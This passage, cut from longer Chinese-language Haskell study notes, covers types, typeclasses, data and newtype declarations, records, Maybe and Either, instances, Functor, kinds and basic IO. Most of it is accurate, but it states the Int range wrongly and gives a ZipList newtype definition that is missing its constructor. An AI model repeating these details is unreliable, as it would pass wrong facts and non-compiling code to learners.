\u7684\u9996\u5b57\u6bcd\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u7528\u7684\u6709\uff1a Int \uff1a\u6574\u578b\uff0c\u6709\u4e0a\u4e0b\u754c\u8303\u56f4\uff0c-2147483647\uff5e2147483648 Integer \uff1a\u6574\u6570\uff0c\u65e0\u754c\uff0c\u4f46\u662f\u6548\u7387\u6bd4Int\u4f4e Float \uff1a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b Double \uff1a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b Bool \uff1a\u5e03\u5c14\u503c Char \uff1a\u5b57\u7b26 String \uff1a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e [Char] Ordering \uff1a\u5927\u5c0f\u5173\u7cfb\uff0c\u5305\u542bLT\u3001EQ\u3001GT\uff0c\u4e14\u5b83\u4eec\u6709\u5927\u5c0f\u5173\u7cfb LT < EQ < GT \u5217\u8868\u7684\u7c7b\u578b\u662f\u7531\u5176\u4e2d\u5143\u7d20\u51b3\u5b9a\u7684\uff0c\u5e76\u4e14\u5217\u8868\u4e2d\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u6240\u4ee5\u5217\u8868\u7684\u7c7b\u578b\u5c31\u662f\u5176\u5143\u7d20\u7c7b\u578b\u5916\u52a0 [] \u3002 \u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u5404\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\uff0c\u56e0\u4e3a\u5143\u7ec4\u4e2d\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u4e0d\u540c\u7c7b\u578b\u3002\u5982 (\"abc\", 'a', True) \u7684\u7c7b\u578b\u662f ([Char], Char, Bool)\u3002 Typeclasses \u00b6 \u7c7b\u578b\u7c7b\uff08Typeclass\uff09\u662f\u5b9a\u4e49\u4e00\u7cfb\u5217\u529f\u80fd\u7684\u63a5\u53e3\uff0c\u5982\u679c\u4e00\u4e2a Type \u5c5e\u4e8e\u4e00\u4e2a Typeclass \u7684\u6210\u5458\uff0c\u90a3\u4e48\u5b83\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u6240\u89c4\u5b9a\u7684\u529f\u80fd\u3002\u4e00\u4e2a Type \u4e5f\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2aTypeclass Typeclass\u7684\u9996\u5b57\u6bcd\u4e5f\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u89c1\u7684\u6709\uff1a Eq \uff1a\u53ef\u5224\u65ad\u662f\u5426\u76f8\u7b49 Ord \uff1a\u53ef\u6bd4\u8f83\u5927\u5c0f Show \uff1a\u53ef\u5c55\u793a\u6210\u5b57\u7b26\u4e32 Read \uff1a\u53ef\u4ece\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u7279\u5b9a\u7c7b\u578b Enum \uff1a\u53ef\u679a\u4e3e\uff08\u8fde\u7eed\uff09\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 pred \u548c succ \u51fd\u6570\u5f97\u5230\u524d\u9a71\u548c\u540e\u7f00 Bounded : \u6709\u4e0a\u4e0b\u754c\uff0c\u5982\u679c\u5143\u7ec4\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u5c5e\u4e8e Bounded\uff0c\u90a3\u8fd9\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u4e5f\u5c5e\u4e8e Bounded Integral \uff1a\u662f\u6574\u6570\uff0c\u5305\u62ec Int \u548c Integer RealFloat \uff1a \u662f\u5b9e\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float \u548c Double RealFrac \uff1a\u662f\u5b9e\u5206\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Ratio\uff08\u5728 Data.Ratio \u6a21\u5757\u4e2d\uff09 Floating \uff1a\u662f\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Complex\uff08\u5728 Data.Complex \u6a21\u5757\u4e2d\uff09 Real \uff1a\u662f\u5b9e\u6570\uff0c\u5305\u62ec Integral \u548c RealFrac \u7684\u6210\u5458 Fractional \uff1a\u662f\u5206\u6570\uff0c\u5305\u62ec RealFrac \u548c Floating \u7684\u6210\u5458 Num \uff1a\u662f\u6570\u5b57\uff0c\u5305\u62ec\u4e0a\u8ff0\u6240\u6709\u6570\u5b57\u76f8\u5173\u7684\u7c7b\u578b Type variables \u00b6 \u5982\u679c\u67e5\u770b\u4e00\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 head \uff0c\u90a3\u4e48\u5c06\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u7c7b\u578b\uff1a head :: [a] -> a \u5176\u4e2d\u7684 a \u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff08type variable\uff09\uff0c\u5b83\u5728 head \u4e2d\u53ef\u4ee5\u5c5e\u4e8e\u4efb\u4f55\u7c7b\u578b\uff0c\u5728\u8fd9\u91cc\u53ea\u662f\u8868\u793a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u548c\u8f93\u5165\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u7684\u7c7b\u578b\u76f8\u4e00\u81f4\u3002 \u5728\u51fd\u6570\u7684\u7c7b\u578b\u8868\u8fbe\u5f0f\u5176\u5b9e\u53ef\u4ee5\u770b\u4f5c \\(\\lambda\\) \u8868\u8fbe\u5f0f\uff0c\u5b83\u9002\u7528\u4e8e \\(\\alpha\\) \u53d8\u6362\uff08 \\(\\alpha\\) -conversion\uff09\u3002\u5373 a \u5728\u8fd9\u91cc\u53ef\u4ee5\u6307 Int\u3001Char \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u6307 [Char], (Int, Char), \u751a\u81f3\u51fd\u6570 Int -> Int \u7b49\u3002 \u5728\u5927\u90e8\u5206\u51fd\u6570\u7684\u7c7b\u578b\u4e2d\uff0c\u7c7b\u578b\u53d8\u91cf\u9700\u8981\u4fdd\u8bc1\u662f\u67d0\u4e2a Typeclass \u7684\u6210\u5458\u624d\u80fd\u5b8c\u6210\u64cd\u4f5c\u3002\u6bd4\u5982 (==) \u51fd\u6570\uff0c\u5b83\u9700\u8981\u4f20\u5165\u7684\u53c2\u6570\u662f\u53ef\u5224\u65ad\u76f8\u7b49\u7684\uff0c\u5373\u662f Eq \u7684\u6210\u5458\uff0c\u90a3\u4e48 (==) \u7684\u7c7b\u578b\u5c31\u662f\uff1a (==) :: (Eq a) => a -> a -> Bool \u5176\u4e2d => \u524d\u7684\u90e8\u5206 (Eq a) \u5c31\u662f\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u5b83\u89c4\u5b9a\u4e86 a \u662f Eq \u7684\u6210\u5458\uff0c\u6240\u4ee5 (==) \u51fd\u6570\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u662f a \u7c7b\u578b\uff0c\u4e14\u90fd\u662f Eq \u7684\u6210\u5458\uff0c\u4fdd\u8bc1\u4e86\u5b83\u4eec\u4e4b\u95f4\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\u3002 \u5b9a\u4e49\u65b0 Type \u00b6 \u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Type \u9700\u8981\u4f7f\u7528 data \u5173\u952e\u5b57\uff0c\u6bd4\u5982\u5b9a\u4e49 Bool \u9700\u8981\u4f7f\u7528\uff1a data Bool = False | True \u5176\u4e2d = \u5de6\u4fa7\u7684\u90e8\u5206\u5b9a\u4e49\u4e86\u65b0\u7c7b\u578b\u7684\u540d\u79f0 Bool \uff0c\u53f3\u4fa7\u7684\u90e8\u5206\u53eb\u505a\u503c\u6784\u9020\u5668\uff08value constructors\uff09\uff0c\u8868\u793a\u4e86 Bool \u7c7b\u578b\u7684\u503c\u4e3a False \u6216 True\u3002 \u5e76\u4e14\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u7684\u9996\u5b57\u6bcd\u90fd\u9700\u8981\u5927\u5199\u3002 \u53e6\u5916\uff0c\u503c\u6784\u9020\u5668\u4e5f\u662f\u51fd\u6570\uff0c\u5b83\u4eec\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u53eb\u505a\u9879\uff08field\uff09\u3002\u6bd4\u5982\uff1a data Shape = Circle Float Float Float | Rectangle Float Float Float Float \u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0 Type \u53eb Shape\uff0c\u503c\u6784\u9020\u5668\u662f Circle \u548c Rectangle\uff0cCircle \u63a5\u6536\u4e09\u4e2a\u53c2\u6570\u90fd\u662f Float \u7c7b\u578b\uff0cRectangle \u63a5\u6536\u56db\u4e2a Float \u7c7b\u578b\u53c2\u6570\u3002 \u5982\u679c\u67e5\u770b Circle \u7684\u7c7b\u578b\uff0c\u5c06\u8fd4\u56de\uff1a Circle :: Float -> Float -> Float -> Shape \u5982\u679c\u60f3\u8981\u8ba9\u5b83\u80fd\u7ed9\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u9700\u8981\u8ba9\u5b83\u5c5e\u4e8e Show \u7c7b\u578b\u7c7b\u3002\u5728\u4ee3\u7801\u4e2d\u53ea\u9700\u8981\u5728\u7ed3\u5c3e\u52a0\u4e0a deriving (Show) : data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving ( Show ) \u7c7b\u578b\u7684\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u540d\u79f0\u4e5f\u53ef\u4ee5\u76f8\u540c\uff0c\u6bd4\u5982\uff1a data Point = Point Float Float deriving ( Show ) \u5bfc\u51fa Type \u00b6 \u5728\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u65b0\u7684 Type \u4e4b\u540e\uff0c\u5982\u679c\u5728\u522b\u7684\u6587\u4ef6\u4e2d\u5c06\u5176\u4f5c\u4e3a\u6a21\u5757\u5bfc\u5165\uff0c\u5219\u9700\u8981\u5148\u5bfc\u51fa\u3002\u6bd4\u5982\u6587\u4ef6 Shapes.hs \u4e2d\u5b9a\u4e49\u4e86 Shape \u548c Point\uff0c\u4ee5\u53ca\u5176\u4ed6\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u90a3\u4e48\u6587\u4ef6\u5f00\u5934\u9700\u8981\u5199\uff1a module Shapes ( Shape ( .. ) , Point ( .. ) , functionA , functionB ) where \u5176\u4e2d\u7684 Shape(..) \u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\u548c\u5b83\u6240\u6709\u7684\u503c\u6784\u9020\u5668\uff0c .. \u4ee3\u8868\u4e86\u5b83\u7684\u6240\u6709\u503c\u6784\u9020\u5668\u3002\u56e0\u6b64\uff0c Shape(..) \u76f8\u5f53\u4e8e Shape (Circle, Rectangle) \u3002 \u5982\u679c\u4e0d\u60f3\u8981\u5bfc\u51fa\u503c\u6784\u9020\u5668\uff0c\u5373\u4e0d\u5141\u8bb8\u4f7f\u7528\u503c\u6784\u9020\u5668\u7684\u65b9\u6cd5\u6765\u521b\u5efa Shape \u7c7b\u578b\u7684\u53d8\u91cf\u3002\u90a3\u4e48\u9700\u8981\u5c06 Shape(..) \u66ff\u6362\u4e3a Shape \uff0c\u8fd9\u6837\u5c31\u53ea\u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\uff0c\u800c\u4e0d\u5bfc\u51fa\u5176\u503c\u6784\u9020\u5668\u3002 Record Syntax \u00b6 \u5982\u679c\u60f3\u8981\u65b9\u4fbf\u5730\u53d6\u51fa\u7c7b\u578b\u5b9e\u4f8b\u4e2d\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 Record \u8bed\u6cd5\uff0c\u5982\uff1a data Point = Point { xcoord :: Float , ycoord :: Float } deriving ( Show ) \u5728\u503c\u6784\u9020\u5668\u7684\u53c2\u6570\u90e8\u5206\u5148\u52a0\u4e00\u4e2a\u5927\u62ec\u53f7\uff0c\u7136\u540e\u6307\u5b9a\u53d6\u51fa\u503c\u7684\u51fd\u6570\u540d\u79f0\uff08xcoord, ycoord\uff09\uff0c\u540e\u9762\u6307\u5b9a\u7c7b\u578b\uff08:: Float\uff09\u3002\u8fd9\u6837 xcoord \u548c ycoord \u5c31\u90fd\u662f\u4e00\u4e2a\u7c7b\u578b\u4e3a Point -> Float \u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u8bbf\u95ee\u503c\uff1a ghci > let point = Point 1.0 2.0 ghci > xcoord point 1.0 ghci > ycoord point 2.0 \u540c\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u521b\u5efa\u8fd9\u4e2a point\uff1a point = Point { ycoord = 2.0 , xcoord = 1.0 } Type parameters \u00b6 \u503c\u6784\u9020\u5668\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u7c7b\u578b\u4e5f\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u8fd9\u6837\u5b83\u5c31\u6210\u4e3a\u4e86\u7c7b\u578b\u6784\u9020\u5668\uff08type constructors\uff09\u3002\u5982 Maybe \u7684\u5b9a\u4e49\uff1a data Maybe a = Nothing | Just a \u5b83\u7684\u503c\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u4e3a Maybe a\uff0c\u662f\u591a\u6001\u7684\uff08polymorphic\uff09\u3002 \u5b83\u7684\u503c\u4e0d\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u53d6\u51b3\u4e8e\u503c Just a \u4e2d a \u7684\u7c7b\u578b\uff0c\u53ef\u4ee5\u6784\u9020\u51fa Maybe Int\u3001Maybe [Char] \u7b49\u591a\u79cd\u7c7b\u578b\uff1a Nothing :: Maybe a Just 1 :: Num a => Maybe a Just 'a' :: Maybe Char Just \"abc\" :: Maybe [ Char ] \u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u6cd5\u6539\u5199 Point\uff1a data Point x y = Point { xcoord :: x , ycoord :: y } deriving ( Show ) \u4f46\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\uff08type parameters\uff09\u5e76\u4e0d\u662f\u603b\u662f\u65b9\u4fbf\uff0c\u6bd4\u5982\u5728\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e0d\u80fd\u53ea\u4f7f\u7528 Point \u6765\u8868\u793a Point \u7c7b\u578b\uff0c\u800c\u662f\u5fc5\u987b\u5199\u6210 Point Float Float\u3002 \u800c\u4e14\u4e0d\u80fd\u5728\u5b9a\u4e49\u7c7b\u578b\u6784\u9020\u5668\u65f6\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u4e0d\u7136\u5728\u4e4b\u540e\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e5f\u90fd\u9700\u8981\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff0c\u5982\uff1a data ( Ord k ) => Map k v = ... toList :: ( Ord k ) => Map k a -> [( k , a )] Either \u00b6 Either \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u6709\u4e24\u4e2a\u503c\u6784\u9020\u5668\uff0c\u5b9a\u4e49\u662f\uff1a data Either a b = Left a | Right b deriving ( Eq , Ord , Read , Show ) \u5982\u679c\u4f7f\u7528\u4e86 Left\uff0c\u90a3\u5b83\u7684 a \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1b\u5982\u679c\u4f7f\u7528\u4e86 Right\uff0c\u90a3\u5b83\u7684 b \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1a ghci > Right 20 Right 20 ghci > Left \"w00t\" Left \"w00t\" ghci > : t Right 'a' Right 'a' :: Either a Char ghci > : t Left True Left True :: Either Bool b Either \u53ef\u4ee5\u770b\u4f5c Maybe \u7684\u8865\u5145\uff0c\u6bd4\u5982 Maybe \u5728\u4f7f\u7528\u65f6\uff0c\u51fa\u73b0\u5f02\u5e38\u53ef\u4ee5\u8fd4\u56de Nothing\uff0c\u4f46\u53ea\u662f\u4e00\u4e2a Nothing\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u4fe1\u606f\uff1b\u4f46 Either \u5305\u542b\u5de6\u503c\u548c\u53f3\u503c\uff0c\u6b63\u5e38\u7ed3\u679c\u8fd4\u56de\u53f3\u503c\uff0c\u800c\u51fa\u73b0\u5f02\u5e38\u5c31\u53ef\u4ee5\u8fd4\u56de\u5305\u542b\u9519\u8bef\u4fe1\u606f\u7684\u5de6\u503c\uff0c\u6bd4\u5982\u5b89\u5168\u9664\u6cd5\uff1a safeDiv :: Int -> Int -> Maybe Int safeDiv _ 0 = Nothing safeDiv x y = Just ( x ` div ` y ) ghci > safeDiv 4 2 Just 2 ghci > safeDiv 1 0 Nothing \u800c\u4f7f\u7528 Either\uff1a safeDiv :: Int -> Int -> Either String Int safeDiv _ 0 = Left \"Divided by zero\" safeDiv x y = Right ( x ` div ` y ) ghci > safeDiv 4 2 Right 2 ghci > safeDiv 1 0 Left \"Divided by zero\" Derived instances \u00b6 \u60f3\u8981\u4f7f\u4e00\u4e2a\u5b9a\u4e49\u7684\u7c7b\u6ee1\u8db3\u67d0\u4e9b Typeclass \u7684\u9700\u6c42\uff0c\u9700\u8981\u4ece\u5176\u6d3e\u751f\uff08derive\uff09\uff0c\u6bd4\u5982\uff1a data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday deriving ( Eq , Ord , Show , Read , Bounded , Enum ) \u8fd9\u6837 Day \u7c7b\u578b\u7684\u503c\uff08Monday\uff5eSunday\uff09\u4e4b\u95f4\u5c31\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\uff08\u4ece Eq \u6d3e\u751f\uff09\uff0c\u6bd4\u8f83\u5927\u5c0f\uff08\u4ece Ord \u6d3e\u751f\uff0c\u5de6\u4fa7\u4e3a\u5c0f\uff0c\u53f3\u4fa7\u4e3a\u5927\uff09\uff0c\u663e\u793a\u6210\u5b57\u7b26\u4e32\uff08\u4ece Show \u6d3e\u751f\uff09\uff0c\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\uff08\u4ece Read \u6d3e\u751f\uff09\uff0c\u5305\u542b\u8fb9\u754c\uff08\u4ece Bounded \u6d3e\u751f\uff09\uff0c\u53ef\u4ee5\u679a\u4e3e\uff08\u4ece Enum \u6d3e\u751f\uff0c\u6309\u7167\u503c\u6784\u9020\u5668\u4e2d\u7684\u987a\u5e8f\u4f9d\u6b21\u5411\u53f3\uff09 Type synonyms \u00b6 \u4e3a\u4e86\u9605\u8bfb\u65b9\u4fbf\uff0c\u4e66\u5199\u7b80\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528 type \u5173\u952e\u5b57\u4e3a\u5df2\u6709\u7c7b\u578b\u521b\u5efa\u522b\u540d\uff08synonyms\uff09\u3002\u6bd4\u5982 String \u7684\u5b9a\u4e49\uff1a type String = [Char] \u5728\u6240\u6709\u9700\u8981\u4f7f\u7528\u5b57\u7b26\u4e32\uff08\u5373 [Char]\uff09\u7684\u5730\u65b9\u90fd\u53ef\u4ee5\u4f7f\u7528 String \u6765\u4ee3\u66ff\uff0c\u5b83\u4eec\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u53ea\u662f String \u66f4\u7b80\u4fbf\u6613\u8bfb\u3002 \u540c\u65f6\uff0c\u7c7b\u578b\u522b\u540d\u4e5f\u53ef\u4ee5\u63a5\u6536\u7c7b\u578b\u53c2\u6570 newtype keyword \u00b6 \u9664\u4e86 data \u3001 type \u5173\u952e\u5b57\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528 newtype \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 Control.Applicative \u6a21\u5757\u4e2d\u7684 ZipList\uff1a newtype ZipList a = { getZipList :: [ a ] } - \u4e0d\u540c\u4e8e type\uff0c\u5b83\u4e0d\u662f\u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528 record \u8bed\u6cd5\u6765\u76f4\u63a5\u5b9a\u4e49\u53d6\u51fa\u503c\u7684\u51fd\u6570 - \u4e0d\u540c\u4e8e data\uff0c\u5b83\u53ea\u80fd\u6709\u4e00\u4e2a\u503c\u6784\u9020\u5668\uff0c\u4f46\u662f\u901f\u5ea6\u8981\u6bd4 data \u5feb\uff0c\u800c\u4e14\u66f4\u52a0\u61d2\u60f0 Recursive data structures \u00b6 \u4e00\u4e2a\u7c7b\u578b\u4e5f\u53ef\u4ee5\u9012\u5f52\u5b9a\u4e49\uff0c\u6bd4\u5982\u4e00\u9897\u4e8c\u53c9\u6811\uff1a data Tree a = EmptyTree | Node a ( Tree a ) ( Tree a ) deriving ( Show , Read , Eq ) \u5b9a\u4e49\u65b0 Typeclass \u00b6 \u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Typeclass \u9700\u8981\u4f7f\u7528 class \u5173\u952e\u5b57\uff0c\u4f8b\u5982\u5b9a\u4e49 Eq \u7c7b\u578b\u7c7b\uff1a class Eq a where ( == ) :: a -> a -> Bool ( /= ) :: a -> a -> Bool x == y = not ( x /= y ) x /= y = not ( x == y ) \u5176\u4e2d a \u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff0c\u524d\u4e24\u884c\u58f0\u660e\u4e86\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u7684\u540d\u5b57\u53ca\u5176\u7c7b\u578b\uff0c\u540e\u4e24\u884c\u8868\u660e\u4e86\u9700\u8981\u7684\u51fd\u6570\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u5b9a\u4e49\uff08\u4e0d\u5fc5\u8981\uff09\u3002 \u5305\u542b\u4e86\u540e\u4e24\u884c\u4e4b\u540e\uff0c\u53ea\u5b9a\u4e49 (==) \u51fd\u6570\u6216\u8005 (/=) \u51fd\u6570\u90fd\u53ef\u4ee5\u5b8c\u6210\u5168\u90e8\u5b9a\u4e49\uff0c\u5b83\u4eec\uff08 (==) | (/=) \uff09\u6210\u4e3a\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u7684\u6700\u5c0f\u5b8c\u6574\u5b9a\u4e49\uff08minimal complete definition\uff09 \u67e5\u770b\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u6210\u5458\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u53ef\u4ee5\u5728 GHCi \u4e2d\u4f7f\u7528 :info \uff1a ghci> :info Eq \u624b\u52a8\u521b\u5efa\u5b9e\u4f8b \u00b6 \u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u5b9e\u4f8b\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 deriving \u6765\u81ea\u52a8\u5b8c\u6210\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 instance \u5173\u952e\u5b57\u6765\u624b\u52a8\u5b8c\u6210\u3002\u6bd4\u5982\u4f7f Point \u6210\u4e3a Show \u7684\u5b9e\u4f8b\uff1a instance Show Point where show ( Point x y ) = \"(\" ++ show x ++ \", \" ++ show y ++ \")\" -- in ghci ghci > Point 1.0 2.0 ( 1.0 , 2.0 ) \u8fd9\u6837\u5c31\u53ef\u4ee5\u81ea\u5b9a\u4e49\u663e\u793a\u7684\u5185\u5bb9\uff0c\u5426\u5219\u4f7f\u7528 deriving \u7684\u8bdd\u53ea\u4f1a\u76f4\u63a5\u5c06\u5176\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u3002 \u540c\u65f6\u4e5f\u8981\u6ce8\u610f\u7c7b\u578b\u548c\u7c7b\u578b\u6784\u9020\u5668\u7684\u533a\u522b\uff0c\u4f20\u5165\u7ed9 instance \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e94\u8be5\u4e3a\u7c7b\u578b\u800c\u4e0d\u662f\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6bd4\u5982 Maybe\uff1a instance Eq Maybe where ... -- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3aMaybe\u662f\u7c7b\u578b\u6784\u9020\u5668\u800c\u4e0d\u662f\u7c7b\u578b instance Eq ( Maybe m ) where ... -- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3am\u4e0d\u4e00\u5b9a\u662fEq\u7684\u6210\u5458 instance ( Eq m ) => Eq ( Maybe m ) where Just x == Just y = x == y Nothing == Nothing = True _ == _ = False Functor Typeclass \u00b6 Functor \u4e5f\u662f\u4e00\u79cd\u7c7b\u578b\u7c7b\uff0c\u5b83\u53ea\u89c4\u5b9a\u4e86\u4e00\u4e2a\u51fd\u6570\uff1a class Functor f where fmap :: ( a -> b ) -> f a -> f b \u5176\u4e2d f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b Kinds \u00b6 \u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u53eb\u505a\u7c7b\u578b\uff08Type\uff09\uff0c\u800c\u4e00\u4e2a\u7c7b\u578b\u7684\u7c7b\u578b\u53eb\u505a Kind\u3002\u53ef\u4ee5\u901a\u8fc7 GHCi \u4e2d :k \u6765\u67e5\u770b Kind\uff1a ghci > : k Int Int :: * ghci > : k Maybe Maybe :: * -> * ghci > : k Maybe Int Maybe Int :: * ghci > : k Either Either :: * -> * -> * \u5176\u4e2d\u7684\u661f\u53f7 * \u4ee3\u8868\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08concrete type\uff09\u3002Int \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Int \u7684 Kind \u662f *\u3002\u800c Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Maybe \u7684 Kind \u662f * -> *\u3002\u5982\u679c\u7ed9 Maybe \u4f20\u5165\u4e86\u4e00\u4e2a Int\uff0c\u90a3\u4e48\u5f97\u5230\u7684 Maybe Int \u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u5b83\u7684 Kind \u5c31\u662f *\u3002Either \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4f46\u5b83\u63a5\u6536\u4e24\u4e2a\u7c7b\u578b\u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6240\u4ee5 Either \u7684 Kind \u662f * -> * -> *\u3002 Input/Output \u00b6 \u8fd0\u884c Haskell \u7a0b\u5e8f \u00b6 \u4e0d\u5728 GHCi \u4e2d\u8fd0\u884c\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a \u7f16\u8bd1\u8fd0\u884c\uff1a $ ghc --make code $ ./code \u901a\u8fc7 runhaskell \u547d\u4ee4\u76f4\u63a5\u8fd0\u884c\uff1a $ runhaskell code.hs \u8f93\u51fa\u6587\u672c \u00b6 \u5728\u4e00\u4e2a Haskell \u7a0b\u5e8f\u4e2d\u8f93\u51fa\u6587\u5b57\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a main \u51fd\u6570\uff1a main = putStrLn \"Hello World\" \u5176\u4e2d putStrLn \u7684\u7c7b\u578b\u662f\uff1a putStrLn :: String -> IO () putStrLn \u63a5\u6536\u4e00\u4e2a String \u7c7b\u578b\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u4e3a () \u7c7b\u578b\u7684 IO \u52a8\u4f5c\uff08I/O action\uff09\u3002\u6240\u4ee5 main \u51fd\u6570\u7684\u7c7b\u578b\u4e3a IO ()\u3002\uff08IO \u7684 Kind \u662f* -> *\uff09 \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u9ed8\u8ba4\u63d0\u4f9b\u7684\u8f93\u51fa\u6587\u672c\u7684\u51fd\u6570\uff1a putStr \uff1a\u8f93\u51fa\u6587\u672c\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c putChar \uff1a\u8f93\u51fa\u5355\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c\u3002\u63a5\u6536\u7684\u53c2\u6570\u4e3a\u5355\u4e2a Char\uff0c\u4e0d\u662f String\uff08\u7528\u5355\u5f15\u53f7\u4e0d\u662f\u53cc\u5f15\u53f7\uff09 print \uff1a\u53ef\u4ee5\u63a5\u6536\u4efb\u4f55 Show \u7684\u6210\u5458\uff0c\u5148\u7528 show \u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u7136\u540e\u8f93\u51fa\u3002\u7b49\u540c\u4e8e putStrLn . show do block \u00b6 \u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528\u591a\u4e2a putStrLn \u9700\u8981\u4f7f\u7528 do \u8bed\u53e5\uff1a main = do putStrLn \"Line1\" putStrLn \"Line2\" \u5176\u4e2d\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u8fd4\u56de IO () \u7c7b\u578b\u7684\u503c 